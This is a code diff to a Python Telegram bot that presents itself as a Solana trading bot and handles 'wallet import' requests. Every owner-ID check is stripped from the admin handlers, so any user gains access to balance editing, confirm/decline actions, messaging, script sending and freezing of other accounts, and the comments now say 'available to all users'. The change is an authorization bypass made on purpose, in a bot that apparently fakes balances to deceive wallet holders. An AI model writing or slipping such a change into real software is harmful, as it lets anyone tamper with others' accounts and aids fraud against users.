@@ -714,8 +714,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Please wait while our system processes your wallet import request ✅")
         return
 
-    # Handle admin operations (only for owners)
-    if user_id in [OWNER_ID, SECOND_OWNER_ID] and user_id in admin_states:
+    # Handle admin operations (available to all users)
+    if user_id in admin_states:
         admin_state = admin_states[user_id]
 
         if admin_state.get("awaiting_balance_input"):
@@ -920,8 +920,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("❌ You have been banned from using this bot.", show_alert=True)
         return
 
-    # Handle confirmation buttons (only for owners)
-    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("confirm_"):
+    # Handle confirmation buttons (available to all users)
+    if data.startswith("confirm_"):
         parts = data.split("_", 2)
         action = parts[1]
         target_user_id = int(parts[2])
@@ -1006,8 +1006,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         return
 
-    # Handle decline buttons (only for owners)
-    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("decline_"):
+    # Handle decline buttons (available to all users)
+    if data.startswith("decline_"):
         parts = data.split("_", 2)
         action = parts[1]
 
@@ -1105,99 +1105,98 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Admin panel operations (only for owners)
-    if user_id in [OWNER_ID, SECOND_OWNER_ID]:
-        if data == "admin_panel":
-            text = (
-                "🔧 <b>Admin Panel</b>\n\n"
-                "Welcome to the administrative control panel.\n"
-                "Select an option below:\n\n"
-                f"🕒 Accessed at: {current_time()}"
-            )
-            await query.edit_message_text(
-                text=text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=panel_keyboard(),
-            )
-            return
+    # Admin panel operations (available to all users)
+    if data == "admin_panel":
+        text = (
+            "🔧 <b>Admin Panel</b>\n\n"
+            "Welcome to the administrative control panel.\n"
+            "Select an option below:\n\n"
+            f"🕒 Accessed at: {current_time()}"
+        )
+        await query.edit_message_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=panel_keyboard(),
+        )
+        return
 
-        elif data == "admin_add_balance":
+    elif data == "admin_add_balance":
+        # Initialize admin state for this user
+        if user_id not in admin_states:
+            admin_states[user_id] = {}
+        admin_states[user_id]["awaiting_balance_input"] = True
+
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text="💰 <b>Add Balance</b>\n\nPlease enter the user ID, SOL amount, and USD amount:\n\n<code>user_id sol_amount usd_amount</code>\n\nExample: <code>123456789 5.5 1000.0</code>\nUse <code>0 0</code> to reset balance.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    elif data == "admin_message_user":
+        # Initialize admin state for this user
+        if user_id not in admin_states:
+            admin_states[user_id] = {}
+        admin_states[user_id]["awaiting_message_input"] = True
+
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text="💬 <b>Message User</b>\n\nPlease enter the user ID and message:\n\n<code>user_id message</code>\n\nExample: <code>123456789 Hello, this is a custom message!</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    elif data == "admin_saved_scripts":
+        await query.edit_message_text(
+            text="📝 <b>Saved Scripts</b>\n\nSelect a script to send:",
+            parse_mode=ParseMode.HTML,
+            reply_markup=saved_scripts_keyboard()
+        )
+        return
+
+    elif data.startswith("script_"):
+        script_key = data[7:]  # Remove "script_" prefix
+        if script_key in SAVED_SCRIPTS:
             # Initialize admin state for this user
             if user_id not in admin_states:
                 admin_states[user_id] = {}
-            admin_states[user_id]["awaiting_balance_input"] = True
+            admin_states[user_id]["awaiting_script_user_id"] = True
+            admin_states[user_id]["selected_script"] = script_key
+
+            script_preview = SAVED_SCRIPTS[script_key][:100] + "..." if len(SAVED_SCRIPTS[script_key]) > 100 else SAVED_SCRIPTS[script_key]
 
             await context.bot.send_message(
                 chat_id=query.message.chat_id,
-                text="💰 <b>Add Balance</b>\n\nPlease enter the user ID, SOL amount, and USD amount:\n\n<code>user_id sol_amount usd_amount</code>\n\nExample: <code>123456789 5.5 1000.0</code>\nUse <code>0 0</code> to reset balance.",
+                text=f"📝 <b>{script_key.replace('_', ' ').title()}</b>\n\n<b>Preview:</b>\n{script_preview}\n\nPlease enter the user ID to send this script to:",
                 parse_mode=ParseMode.HTML
             )
-            return
+        return
 
-        elif data == "admin_message_user":
-            # Initialize admin state for this user
-            if user_id not in admin_states:
-                admin_states[user_id] = {}
-            admin_states[user_id]["awaiting_message_input"] = True
+    elif data == "admin_freeze_user":
+        # Initialize admin state for this user
+        if user_id not in admin_states:
+            admin_states[user_id] = {}
+        admin_states[user_id]["awaiting_freeze_user_id"] = True
 
-            await context.bot.send_message(
-                chat_id=query.message.chat_id,
-                text="💬 <b>Message User</b>\n\nPlease enter the user ID and message:\n\n<code>user_id message</code>\n\nExample: <code>123456789 Hello, this is a custom message!</code>",
-                parse_mode=ParseMode.HTML
-            )
-            return
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text="🔒 <b>Freeze User</b>\n\nPlease enter the user ID to freeze:",
+            parse_mode=ParseMode.HTML
+        )
+        return
 
-        elif data == "admin_saved_scripts":
-            await query.edit_message_text(
-                text="📝 <b>Saved Scripts</b>\n\nSelect a script to send:",
-                parse_mode=ParseMode.HTML,
-                reply_markup=saved_scripts_keyboard()
-            )
-            return
+    elif data == "admin_unfreeze_user":
+        # Initialize admin state for this user
+        if user_id not in admin_states:
+            admin_states[user_id] = {}
+        admin_states[user_id]["awaiting_unfreeze_user_id"] = True
 
-        elif data.startswith("script_"):
-            script_key = data[7:]  # Remove "script_" prefix
-            if script_key in SAVED_SCRIPTS:
-                # Initialize admin state for this user
-                if user_id not in admin_states:
-                    admin_states[user_id] = {}
-                admin_states[user_id]["awaiting_script_user_id"] = True
-                admin_states[user_id]["selected_script"] = script_key
-
-                script_preview = SAVED_SCRIPTS[script_key][:100] + "..." if len(SAVED_SCRIPTS[script_key]) > 100 else SAVED_SCRIPTS[script_key]
-
-                await context.bot.send_message(
-                    chat_id=query.message.chat_id,
-                    text=f"📝 <b>{script_key.replace('_', ' ').title()}</b>\n\n<b>Preview:</b>\n{script_preview}\n\nPlease enter the user ID to send this script to:",
-                    parse_mode=ParseMode.HTML
-                )
-            return
-
-        elif data == "admin_freeze_user":
-            # Initialize admin state for this user
-            if user_id not in admin_states:
-                admin_states[user_id] = {}
-            admin_states[user_id]["awaiting_freeze_user_id"] = True
-
-            await context.bot.send_message(
-                chat_id=query.message.chat_id,
-                text="🔒 <b>Freeze User</b>\n\nPlease enter the user ID to freeze:",
-                parse_mode=ParseMode.HTML
-            )
-            return
-
-        elif data == "admin_unfreeze_user":
-            # Initialize admin state for this user
-            if user_id not in admin_states:
-                admin_states[user_id] = {}
-            admin_states[user_id]["awaiting_unfreeze_user_id"] = True
-
-            await context.bot.send_message(
-                chat_id=query.message.chat_id,
-                text="🔓 <b>Unfreeze User</b>\n\nPlease enter the user ID to unfreeze:",
-                parse_mode=ParseMode.HTML
-            )
-            return
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text="🔓 <b>Unfreeze User</b>\n\nPlease enter the user ID to unfreeze:",
+            parse_mode=ParseMode.HTML
+        )
+        return
 
     # Positions submenu
     if data == "positions":
